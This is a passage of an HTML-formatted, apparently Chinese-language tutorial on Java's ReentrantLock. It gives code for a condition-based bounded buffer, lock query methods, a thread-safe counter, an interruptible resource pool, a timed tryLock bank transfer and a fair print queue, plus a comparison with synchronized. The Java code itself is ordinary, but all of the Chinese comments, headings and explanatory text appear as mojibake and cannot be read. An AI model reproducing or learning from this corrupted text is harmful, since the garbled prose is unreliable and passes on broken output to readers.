    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// éæ»¡æ¡ä»¶</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">10</span>];
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> putIndex, takeIndex, count;
    
    <span class="hljs-comment">/**
     * ç”Ÿäº§è€…ï¼šæ·»åŠ å…ƒç´ 
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(Object item)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é˜Ÿåˆ—æ»¡æ—¶ï¼Œç­‰å¾…notFullæ¡ä»¶</span>
            <span class="hljs-keyword">while</span> (count == items.length) {
                notFull.await();
            }
            items[putIndex] = item;
            <span class="hljs-keyword">if</span> (++putIndex == items.length) putIndex = <span class="hljs-number">0</span>;
            count++;
            <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…ï¼šé˜Ÿåˆ—éç©ºäº†</span>
            notEmpty.signal();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * æ¶ˆè´¹è€…ï¼šå–å‡ºå…ƒç´ 
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">take</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é˜Ÿåˆ—ç©ºæ—¶ï¼Œç­‰å¾…notEmptyæ¡ä»¶</span>
            <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>) {
                notEmpty.await();
            }
            <span class="hljs-type">Object</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> items[takeIndex];
            items[takeIndex] = <span class="hljs-literal">null</span>;
            <span class="hljs-keyword">if</span> (++takeIndex == items.length) takeIndex = <span class="hljs-number">0</span>;
            count--;
            <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…ï¼šé˜Ÿåˆ—éæ»¡äº†</span>
            notFull.signal();
            <span class="hljs-keyword">return</span> item;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-17">3.8 å…¶ä»–è¾…åŠ©æ–¹æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLockçš„è¾…åŠ©æ–¹æ³•
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuxiliaryMethodsExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å…¬å¹³é”</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateAuxiliaryMethods</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æŸ¥è¯¢é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> lock.isLocked();
            System.out.println(<span class="hljs-string">"é”æ˜¯å¦è¢«æŒæœ‰: "</span> + locked);  <span class="hljs-comment">// true</span>
            
            <span class="hljs-comment">// æŸ¥è¯¢å½“å‰çº¿ç¨‹çš„æŒæœ‰è®¡æ•°</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">holdCount</span> <span class="hljs-operator">=</span> lock.getHoldCount();
            System.out.println(<span class="hljs-string">"å½“å‰çº¿ç¨‹æŒæœ‰æ¬¡æ•°: "</span> + holdCount);  <span class="hljs-comment">// 1</span>
            
            <span class="hljs-comment">// æŸ¥è¯¢å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">heldByMe</span> <span class="hljs-operator">=</span> lock.isHeldByCurrentThread();
            System.out.println(<span class="hljs-string">"å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”: "</span> + heldByMe);  <span class="hljs-comment">// true</span>
            
            <span class="hljs-comment">// æŸ¥è¯¢æ˜¯å¦ä¸ºå…¬å¹³é”</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">fair</span> <span class="hljs-operator">=</span> lock.isFair();
            System.out.println(<span class="hljs-string">"æ˜¯å¦ä¸ºå…¬å¹³é”: "</span> + fair);  <span class="hljs-comment">// true</span>
            
            <span class="hljs-comment">// æŸ¥è¯¢æ˜¯å¦æœ‰çº¿ç¨‹åœ¨ç­‰å¾…è·å–é”</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWaiters</span> <span class="hljs-operator">=</span> lock.hasQueuedThreads();
            System.out.println(<span class="hljs-string">"æ˜¯å¦æœ‰ç­‰å¾…çº¿ç¨‹: "</span> + hasWaiters);
            
            <span class="hljs-comment">// æŸ¥è¯¢ç­‰å¾…é˜Ÿåˆ—é•¿åº¦</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">queueLength</span> <span class="hljs-operator">=</span> lock.getQueueLength();
            System.out.println(<span class="hljs-string">"ç­‰å¾…é˜Ÿåˆ—é•¿åº¦: "</span> + queueLength);
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-18">4. å…¸å‹ä½¿ç”¨åœºæ™¯</h3>
<h4 data-id="heading-19">4.1 åœºæ™¯ä¸€ï¼šçº¿ç¨‹å®‰å…¨çš„è®¡æ•°å™¨</h4>
<p>è¿™æ˜¯æœ€åŸºç¡€çš„ä½¿ç”¨åœºæ™¯ï¼Œç¡®ä¿å¤šçº¿ç¨‹ç¯å¢ƒä¸‹è®¡æ•°æ“ä½œçš„åŸå­æ€§ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * çº¿ç¨‹å®‰å…¨çš„è®¡æ•°å™¨
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadSafeCounter</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">/**
     * åŸå­é€’å¢
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            count++;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * åŸå­é€’å‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decrement</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            count--;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * è·å–å½“å‰å€¼ï¼ˆéœ€è¦åŠ é”ä¿è¯å¯è§æ€§ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> count;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å¦‚æœå½“å‰å€¼ç­‰äºé¢„æœŸå€¼ï¼Œåˆ™æ›´æ–°ä¸ºæ–°å€¼
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(<span class="hljs-type">long</span> expected, <span class="hljs-type">long</span> newValue)</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (count == expected) {
                count = newValue;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-20">4.2 åœºæ™¯äºŒï¼šå¯ä¸­æ–­çš„èµ„æºè·å–</h4>
<p>åœ¨éœ€è¦èƒ½å¤Ÿå–æ¶ˆé•¿æ—¶é—´ç­‰å¾…çš„åœºæ™¯ä¸­ä½¿ç”¨<code>lockInterruptibly()</code>ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¯ä¸­æ–­çš„èµ„æºæ± 
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterruptibleResourcePool</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">available</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;Resource&gt; resources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> maxSize;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InterruptibleResourcePool</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize)</span> {
        <span class="hljs-built_in">this</span>.maxSize = maxSize;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; maxSize; i++) {
            resources.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Resource</span>(i));
        }
    }
    
    <span class="hljs-comment">/**
     * å¯ä¸­æ–­åœ°è·å–èµ„æº
     * æ”¯æŒåœ¨ç­‰å¾…è¿‡ç¨‹ä¸­å–æ¶ˆ
     */</span>
    <span class="hljs-keyword">public</span> Resource <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lockInterruptibly();  <span class="hljs-comment">// å¯ä¸­æ–­åœ°è·å–é”</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ç­‰å¾…å¯ç”¨èµ„æº</span>
            <span class="hljs-keyword">while</span> (resources.isEmpty()) {
                available.await();  <span class="hljs-comment">// å¯ä¸­æ–­åœ°ç­‰å¾…</span>
            }
            <span class="hljs-keyword">return</span> resources.remove(<span class="hljs-number">0</span>);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å½’è¿˜èµ„æº
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(Resource resource)</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            resources.add(resource);
            available.signal();  <span class="hljs-comment">// é€šçŸ¥ç­‰å¾…çº¿ç¨‹</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * ä½¿ç”¨ç¤ºä¾‹
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">InterruptibleResourcePool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterruptibleResourcePool</span>(<span class="hljs-number">2</span>);
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">worker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Resource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> pool.acquire();
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// ä½¿ç”¨èµ„æº</span>
                    resource.use();
                } <span class="hljs-keyword">finally</span> {
                    pool.release(resource);
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                System.out.println(<span class="hljs-string">"èµ„æºè·å–è¢«å–æ¶ˆ"</span>);
            }
        });
        
        worker.start();
        
        <span class="hljs-comment">// å¯ä»¥åœ¨éœ€è¦æ—¶å–æ¶ˆç­‰å¾…</span>
        <span class="hljs-comment">// worker.interrupt();</span>
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Resource</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> id;
    
    Resource(<span class="hljs-type">int</span> id) { <span class="hljs-built_in">this</span>.id = id; }
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">use</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"ä½¿ç”¨èµ„æº: "</span> + id);
    }
}
</code></pre>
<h4 data-id="heading-21">4.3 åœºæ™¯ä¸‰ï¼šè¶…æ—¶è·å–é”é¿å…æ­»é”</h4>
<p>åœ¨å¯èƒ½å‘ç”Ÿæ­»é”çš„åœºæ™¯ä¸­ï¼Œä½¿ç”¨<code>tryLock(timeout)</code>æ¥é¿å…æ°¸ä¹…é˜»å¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å®‰å…¨çš„é“¶è¡Œè½¬è´¦ï¼ˆé¿å…æ­»é”ï¼‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeBankTransfer</span> {
    
    <span class="hljs-comment">/**
     * å¸¦è¶…æ—¶çš„è½¬è´¦æ“ä½œ
     * é€šè¿‡è¶…æ—¶æœºåˆ¶é¿å…æ­»é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transfer</span><span class="hljs-params">(BankAccount from, BankAccount to, 
                           <span class="hljs-type">double</span> amount, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">deadline</span> <span class="hljs-operator">=</span> System.nanoTime() + unit.toNanos(timeout);
        
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">if</span> (from.lock.tryLock()) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// è®¡ç®—å‰©ä½™è¶…æ—¶æ—¶é—´</span>
                    <span class="hljs-type">long</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> deadline - System.nanoTime();
                    <span class="hljs-keyword">if</span> (remaining &lt;= <span class="hljs-number">0</span>) {
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¶…æ—¶</span>
                    }
                    
                    <span class="hljs-comment">// å°è¯•è·å–ç¬¬äºŒæŠŠé”</span>
                    <span class="hljs-keyword">if</span> (to.lock.tryLock(remaining, TimeUnit.NANOSECONDS)) {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-comment">// æ£€æŸ¥ä½™é¢</span>
                            <span class="hljs-keyword">if</span> (from.getBalance() &lt; amount) {
                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsufficientFundsException</span>();
                            }
                            <span class="hljs-comment">// æ‰§è¡Œè½¬è´¦</span>
                            from.debit(amount);
                            to.credit(amount);
                            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                        } <span class="hljs-keyword">finally</span> {
                            to.lock.unlock();
                        }
                    }
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                } <span class="hljs-keyword">finally</span> {
                    from.lock.unlock();
                }
            }
            
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼ŒçŸ­æš‚ä¼‘çœ åé‡è¯•</span>
            <span class="hljs-keyword">if</span> (System.nanoTime() &gt;= deadline) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¶…æ—¶</span>
            }
            
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">10</span>);  <span class="hljs-comment">// é¿å…å¿™ç­‰å¾…</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        }
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BankAccount</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BankAccount</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> {
        <span class="hljs-built_in">this</span>.balance = balance;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> balance; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">debit</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> { balance -= amount; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">credit</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> { balance += amount; }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">InsufficientFundsException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InsufficientFundsException</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>(<span class="hljs-string">"ä½™é¢ä¸è¶³"</span>);
    }
}
</code></pre>
<h4 data-id="heading-22">4.4 åœºæ™¯å››ï¼šå…¬å¹³é”ä¿è¯é¡ºåº</h4>
<p>åœ¨éœ€è¦ä¸¥æ ¼æŒ‰ç…§è¯·æ±‚é¡ºåºå¤„ç†çš„åœºæ™¯ä¸­ä½¿ç”¨å…¬å¹³é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å…¬å¹³çš„æ‰“å°é˜Ÿåˆ—
 * ç¡®ä¿æ‰“å°ä»»åŠ¡æŒ‰æäº¤é¡ºåºæ‰§è¡Œ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairPrintQueue</span> {
    
    <span class="hljs-comment">// ä½¿ç”¨å…¬å¹³é”ï¼Œä¿è¯FIFOé¡ºåº</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-comment">/**
     * æ‰“å°æ–‡æ¡£
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printJob</span><span class="hljs-params">(String document)</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            System.out.printf(<span class="hljs-string">"[%s] å¼€å§‹æ‰“å°: %s%n"</span>, 
                Thread.currentThread().getName(), document);
            
            <span class="hljs-comment">// æ¨¡æ‹Ÿæ‰“å°è€—æ—¶</span>
            simulatePrinting();
            
            System.out.printf(<span class="hljs-string">"[%s] å®Œæˆæ‰“å°: %s%n"</span>, 
                Thread.currentThread().getName(), document);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simulatePrinting</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">100</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">FairPrintQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FairPrintQueue</span>();
        
        <span class="hljs-comment">// åˆ›å»º10ä¸ªæ‰“å°ä»»åŠ¡</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">docNum</span> <span class="hljs-operator">=</span> i;
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
                queue.printJob(<span class="hljs-string">"æ–‡æ¡£-"</span> + docNum);
            }, <span class="hljs-string">"Thread-"</span> + i).start();
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-23">5. ReentrantLock vs synchronized</h3>
<h4 data-id="heading-24">5.1 åŠŸèƒ½å¯¹æ¯”</h4>




























































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ReentrantLock</th><th align="left">synchronized</th></tr></thead><tbody><tr><td align="left">å®ç°æ–¹å¼</td><td align="left">JDKå®ç°ï¼ˆçº¯Javaï¼‰</td><td align="left">JVMå†…ç½®ï¼ˆnativeï¼‰</td></tr><tr><td align="left">é”è·å–æ–¹å¼</td><td align="left">æ˜¾å¼lock()/unlock()</td><td align="left">éšå¼ï¼Œè¿›å…¥/é€€å‡ºä»£ç å—</td></tr><tr><td align="left">å¯ä¸­æ–­ç­‰å¾…</td><td align="left">âœ… lockInterruptibly()</td><td align="left">âŒ</td></tr><tr><td align="left">è¶…æ—¶è·å–</td><td align="left">âœ… tryLock(timeout)</td><td align="left">âŒ</td></tr><tr><td align="left">éé˜»å¡è·å–</td><td align="left">âœ… tryLock()</td><td align="left">âŒ</td></tr><tr><td align="left">å…¬å¹³é”</td><td align="left">âœ… æ„é€ å‚æ•°å¯é€‰</td><td align="left">âŒ éå…¬å¹³</td></tr><tr><td align="left">æ¡ä»¶å˜é‡</td><td align="left">âœ… å¤šä¸ªCondition</td><td align="left">âŒ å•ä¸€wait/notify</td></tr><tr><td align="left">é”çŠ¶æ€æŸ¥è¯¢</td><td align="left">âœ… isLocked()ç­‰</td><td align="left">âŒ</td></tr><tr><td align="left">è‡ªåŠ¨é‡Šæ”¾</td><td align="left">âŒ å¿…é¡»æ‰‹åŠ¨unlock</td><td align="left">âœ… è‡ªåŠ¨é‡Šæ”¾</td></tr><tr><td align="left">é”ç»‘å®šå¯¹è±¡</td><td align="left">ReentrantLockå®ä¾‹</td><td align="left">ä»»æ„å¯¹è±¡</td></tr></tbody></table>
<h4 data-id="heading-25">5.2 æ€§èƒ½å¯¹æ¯”</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0097e285acd4a328b65a74995d9ebd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=25f3M%2FS33CYk3yHe3QEvg5qTrQg%3D" alt="performance-comparison.drawio.png" loading="lazy"/></p>
<ul>
<li><strong>JDK 1.5</strong>: ReentrantLockæ€§èƒ½è¿œä¼˜äºsynchronized</li>
<li><strong>JDK 1.6+</strong>: synchronizedç»è¿‡ä¼˜åŒ–ï¼ˆåå‘é”ã€è½»é‡çº§é”ï¼‰ï¼Œæ€§èƒ½å·®è·ç¼©å°</li>
<li><strong>ä½ç«äº‰åœºæ™¯</strong>: synchronizedç•¥ä¼˜ï¼ˆå°‘äº†lockå¯¹è±¡çš„å¼€é”€ï¼‰</li>
<li><strong>é«˜ç«äº‰åœºæ™¯</strong>: ReentrantLockæ›´å¯æ§ï¼ˆå¯é€‰å…¬å¹³é”ã€å¯ä¸­æ–­ï¼‰</li>
</ul>
<h4 data-id="heading-26">5.3 ä»£ç å¯¹æ¯”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * synchronized vs ReentrantLock ä»£ç å¯¹æ¯”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockComparison</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">syncLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">reentrantLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">// ========== åŸºæœ¬ç”¨æ³•å¯¹æ¯” ==========</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizedMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (syncLock) {
            <span class="hljs-comment">// ä¸´ç•ŒåŒº</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reentrantLockMethod</span><span class="hljs-params">()</span> {
        reentrantLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä¸´ç•ŒåŒº</span>
        } <span class="hljs-keyword">finally</span> {
            reentrantLock.unlock();
        }
    }
    
    <span class="hljs-comment">// ========== ç­‰å¾…/é€šçŸ¥å¯¹æ¯” ==========</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizedWait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">synchronized</span> (syncLock) {
            syncLock.wait();     <span class="hljs-comment">// ç­‰å¾…</span>
            syncLock.notify();   <span class="hljs-comment">// é€šçŸ¥å•ä¸ª</span>
            syncLock.notifyAll();<span class="hljs-comment">// é€šçŸ¥æ‰€æœ‰</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> reentrantLock.newCondition();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reentrantLockWait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        reentrantLock.lock();
        <span class="hljs-keyword">try</span> {
            condition.await();     <span class="hljs-comment">// ç­‰å¾…</span>
            condition.signal();    <span class="hljs-comment">// é€šçŸ¥å•ä¸ª</span>
            condition.signalAll(); <span class="hljs-comment">// é€šçŸ¥æ‰€æœ‰</span>
        } <span class="hljs-keyword">finally</span> {
            reentrantLock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-27">5.4 é€‰æ‹©å»ºè®®</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73b7f9218a5849e090342bd230668e57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=Pwv2%2F9okDmXAXdFCoRkUmi7nHUs%3D" alt="lock-selection.drawio.png" loading="lazy"/></p>
<p><strong>é€‰æ‹©synchronizedçš„æƒ…å†µ</strong>ï¼š</p>
<ul>
<li>ç®€å•åŒæ­¥éœ€æ±‚</li>
<li>ä¸éœ€è¦é«˜çº§ç‰¹æ€§</li>
<li>è¿½æ±‚ä»£ç ç®€æ´</li>
<li>å›¢é˜Ÿå¯¹ReentrantLockä¸ç†Ÿæ‚‰</li>
</ul>
<p><strong>é€‰æ‹©ReentrantLockçš„æƒ…å†µ</strong>ï¼š</p>
<ul>
<li>éœ€è¦å¯ä¸­æ–­ç­‰å¾…</li>
<li>éœ€è¦è¶…æ—¶è·å–</li>
<li>éœ€è¦å…¬å¹³é”</li>
<li>éœ€è¦å¤šä¸ªæ¡ä»¶å˜é‡</li>
<li>éœ€è¦æŸ¥è¯¢é”çŠ¶æ€</li>
<li>éœ€è¦æ›´ç»†ç²’åº¦çš„é”æ§åˆ¶</li>
</ul>
<h4 data-id="heading-28">5.5 å¼‚å¸¸å¤„ç†çš„å…³é”®åŒºåˆ«</h4>
